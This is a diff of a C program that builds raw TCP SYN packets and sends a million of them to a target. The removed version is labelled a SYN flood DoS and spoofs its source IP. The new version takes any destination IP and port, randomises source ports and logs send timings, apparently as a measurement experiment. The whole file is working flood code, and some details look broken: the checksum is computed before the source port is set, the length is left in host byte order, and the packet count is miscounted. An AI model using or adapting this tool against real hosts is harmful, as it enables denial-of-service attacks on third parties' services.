@@ -1,143 +1,182 @@
-/*
-    Syn Flood DOS with LINUX sockets
-*/
-#include <errno.h>       //For errno - the error number
-#include <netinet/ip.h>  //Provides declarations for ip header
-#include <netinet/tcp.h> //Provides declarations for tcp header
+#include <arpa/inet.h>
+#include <errno.h>
+#include <netinet/in.h>
+#include <netinet/ip.h>
+#include <netinet/tcp.h>
 #include <stdio.h>
-#include <stdlib.h> //for exit(0);
-#include <string.h> //memset
+#include <stdlib.h>
+#include <string.h>
 #include <sys/socket.h>
+#include <sys/types.h>
 #include <time.h>
-struct pseudo_header // needed for checksum calculation
-{
-  unsigned int source_address;
-  unsigned int dest_address;
-  unsigned char placeholder;
-  unsigned char protocol;
-  unsigned short tcp_length;
+#include <unistd.h>
 
-  struct tcphdr tcp;
+/*
+ * The pseudo header that is used in checksum calculations.
+ * From http://www.enderunix.org/docs/en/rawipspoof/.
+ */
+struct tcp_pseudo_header {
+    struct in_addr src;
+    struct in_addr dst;
+    uint8_t pad;
+    uint8_t proto;
+    uint16_t tcp_len;
+    struct tcphdr tcp;
 };
 
-unsigned short csum(unsigned short *ptr, int nbytes) {
-  register long sum;
-  unsigned short oddbyte;
-  register short answer;
+/*
+ * Calculate the Internet checksum, as described in RFC1071.
+ * The implementation is from: http://www.enderunix.org/docs/en/rawipspoof/
+ * TODO: Understand the algorithm and rewrite it.
+ */
+uint16_t inet_checksum(uint16_t *addr, int len)
+{
+    int nleft = len;
+    int sum = 0;
+    uint16_t *w = addr;
+    uint16_t answer = 0;
 
-  sum = 0;
-  while (nbytes > 1) {
-    sum += *ptr++;
-    nbytes -= 2;
-  }
-  if (nbytes == 1) {
-    oddbyte = 0;
-    *((u_char *)&oddbyte) = *(u_char *)ptr;
-    sum += oddbyte;
-  }
+    while (nleft > 1) {
+        sum += *w++;
+        nleft -= 2;
+    }
 
-  sum = (sum >> 16) + (sum & 0xffff);
-  sum = sum + (sum >> 16);
-  answer = (short)~sum;
+    if (nleft == 1) {
+        *(unsigned char *) (&answer) = *(unsigned char *) w;
+        sum += answer;
+    }
 
-  return (answer);
+    sum = (sum >> 16) + (sum & 0xFFFF);
+    sum += (sum >> 16);
+    answer = ~sum;
+    return (answer);
 }
 
-int main(void) {
-  // Create a raw socket
-  int s = socket(PF_INET, SOCK_RAW, IPPROTO_TCP);
-  // Datagram to represent the packet
-  char datagram[4096], source_ip[32];
-  // IP header
-  struct iphdr *iph = (struct iphdr *)datagram;
-  // TCP header
-  struct tcphdr *tcph = (struct tcphdr *)(datagram + sizeof(struct ip));
-  struct sockaddr_in sin;
-  struct pseudo_header psh;
-
-  strcpy(source_ip, "192.168.1.2");
-
-  sin.sin_family = AF_INET;
-  sin.sin_port = htons(80);
-  sin.sin_addr.s_addr = inet_addr("1.2.3.4");
-
-  memset(datagram, 0, 4096); /* zero out the buffer */
-
-  // Fill in the IP Header
-  iph->ihl = 5;
-  iph->version = 4;
-  iph->tos = 0;
-  iph->tot_len = sizeof(struct ip) + sizeof(struct tcphdr);
-  iph->id = htons(54321); // Id of this packet
-  iph->frag_off = 0;
-  iph->ttl = 255;
-  iph->protocol = IPPROTO_TCP;
-  iph->check = 0;                    // Set to 0 before calculating checksum
-  iph->saddr = inet_addr(source_ip); // Spoof the source ip address
-  iph->daddr = sin.sin_addr.s_addr;
-
-  iph->check = csum((unsigned short *)datagram, iph->tot_len >> 1);
-
-  // TCP Header
-  tcph->source = htons(1234);
-  tcph->dest = htons(80);
-  tcph->seq = 0;
-  tcph->ack_seq = 0;
-  tcph->doff = 5; /* first and only tcp segment */
-  tcph->fin = 0;
-  tcph->syn = 1;
-  tcph->rst = 0;
-  tcph->psh = 0;
-  tcph->ack = 0;
-  tcph->urg = 0;
-  tcph->window = htons(5840); /* maximum allowed window size */
-  tcph->check = 0; /* if you set a checksum to zero, your kernel's IP stack
-               should fill in the correct checksum during transmission */
-  tcph->urg_ptr = 0;
-  // Now the IP checksum
-
-  psh.source_address = inet_addr(source_ip);
-  psh.dest_address = sin.sin_addr.s_addr;
-  psh.placeholder = 0;
-  psh.protocol = IPPROTO_TCP;
-  psh.tcp_length = htons(20);
-
-  memcpy(&psh.tcp, tcph, sizeof(struct tcphdr));
-
-  tcph->check = csum((unsigned short *)&psh, sizeof(struct pseudo_header));
-
-  // IP_HDRINCL to tell the kernel that headers are included in the packet
-  int one = 1;
-  const int *val = &one;
-  if (setsockopt(s, IPPROTO_IP, IP_HDRINCL, val, sizeof(one)) < 0) {
-    printf(
-        "Error setting IP_HDRINCL. Error number : %d . Error message : %s \n",
-        errno, strerror(errno));
-    exit(0);
-  }
-  // Sending one million syn packets
-  for (int i = 0; i < 100; i++) {
-    for (int i = 0; i < 10000; i++) {
-      // Send the packet
-      clock_t begin = clock();
-      if (sendto(s,            /* our socket */
-                 datagram,     /* the buffer containing headers and data */
-                 iph->tot_len, /* total length of our datagram */
-                 0,            /* routing flags, normally always 0 */
-                 (struct sockaddr *)&sin, /* socket addr, just like in */
-                 sizeof(sin)) < 0)        /* a normal send() */
-      {
-        printf("error\n");
-      }
-      // Data send successfully
-      else {
-        printf("Packet Send \n");
-        clock_t end = clock();
-        // The next line outputs the time spent in seconds.
-        double time_spent = (double)(end - begin) / CLOCKS_PER_SEC;
-      }
+int main(int argc, char **argv)
+{
+    if (argc != 3) {
+        fprintf(stderr, "Usage: %s dest_ip dest_port\n", argv[0]);
+        return 1;
     }
-  }
 
-  return 0;
+    srand(time(NULL));
+
+    int fd;
+    
+    fd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
+    if (fd == -1) {
+        perror("socket()");
+        return 1;
+    }
+
+    /*
+     * Prepare the IP header.
+     */
+    struct iphdr ip_header = {
+        /*
+         * The Internet Header Length (IHL) field has 4 bits, which is the
+         * number of 32-bit words. Since an IPv4 header may contain a
+         * variable number of options, this field specifies the size of the
+         * header (this also coincides with the offset to the data). The
+         * minimum value for this field is 5,[22] which indicates a length
+         * of 5 × 32 bits = 160 bits = 20 bytes.
+         * https://en.wikipedia.org/wiki/IPv4#IHL
+         */
+        .ihl = 5,
+        .version = 4,
+        .tos = 0,
+        .tot_len = 0, // Filled in by the kernel when left 0
+        .id = 0, // Ditto
+        .frag_off = 0,
+        .ttl = 64,
+        .protocol = IPPROTO_TCP,
+        .check = 0, // Again, filled in by the kernel
+        .saddr = 0, // Filled later
+        .daddr = inet_addr(argv[1]) // Checked for errors below
+    };
+
+    if (ip_header.daddr == INADDR_NONE) {
+        fprintf(stderr, "Destination IP invalid: %s\n", argv[1]);
+        return 1;
+    }
+
+    unsigned long dport;
+    dport = strtoul(argv[2], NULL, 10);
+    if (dport > 65535 || dport == 0) {
+        fprintf(stderr, "Destination port invalid: %s\n", argv[2]);
+        return 1;
+    }
+    /*
+     * Prepare the TCP header.
+     */
+    struct tcphdr tcp_header = {
+        .source = 0, // Filled later
+        .dest = htons(dport),
+        .seq = random(),
+        .ack_seq = 0,
+        .res1 = 0,
+        .doff = 5,
+        .fin = 0,
+        .syn = 1,
+        .rst = 0,
+        .psh = 0,
+        .ack = 0,
+        .urg = 0,
+        .res2 = 0,
+        .window = htons(65535),
+        .check = 0, // Filled later
+        .urg_ptr = 0
+    };
+
+    // Writing to a file
+    FILE *fp;
+    fp = fopen("syns_results_c.txt", "a+");
+    clock_t total_begin = clock();
+
+
+ //Sending one million syn packets
+      for (int i =0 ; i < 100; i++ ){
+        for(int j = 0; j < 10000; j++){ 
+            clock_t begin = clock();
+            struct tcp_pseudo_header phdr = {
+                .src.s_addr = ip_header.saddr,
+                .dst.s_addr = ip_header.daddr,
+                .pad = 0,
+                .proto = ip_header.protocol,
+                .tcp_len = sizeof(tcp_header), // No payload, only the header.
+                .tcp = tcp_header
+            };
+            tcp_header.source = htons((random() % (61000 - 32768 + 1)) + 32768);
+            tcp_header.check = inet_checksum((uint16_t *)&phdr, sizeof phdr);
+
+            char packet_buf[sizeof tcp_header + sizeof ip_header];
+            memcpy(packet_buf, &ip_header, sizeof ip_header);
+            memcpy(packet_buf + sizeof ip_header, &tcp_header, sizeof tcp_header);
+
+            struct sockaddr_in sin = {
+                .sin_family = AF_INET,
+                .sin_addr.s_addr = ip_header.daddr
+            };
+            if (sendto(fd, packet_buf, sizeof packet_buf, 0, (struct sockaddr *)&sin, sizeof sin) == -1) {
+                perror("sendto()");
+                return 1;
+            }else{
+                printf("Packet Send \n");
+                clock_t end = clock();
+                // The next line outputs the time spent in seconds.
+                double time_spent = (double)(end - begin) / CLOCKS_PER_SEC;
+                int packet_number = j + (i * 100);
+                fprintf(fp, "%d,%lf\n", packet_number, time_spent);
+            }
+            usleep(200000); // This may be tuned further
+        }
+      }
+    clock_t total_end = clock();
+    double total_time = (double)(total_end - total_begin) / CLOCKS_PER_SEC;
+    fprintf(fp, "\nTotal time - %lf", total_time);
+    fclose(fp);
+    // TODO Calculate the AVG time and add it to the file.
+
+
+    return 0;
 }
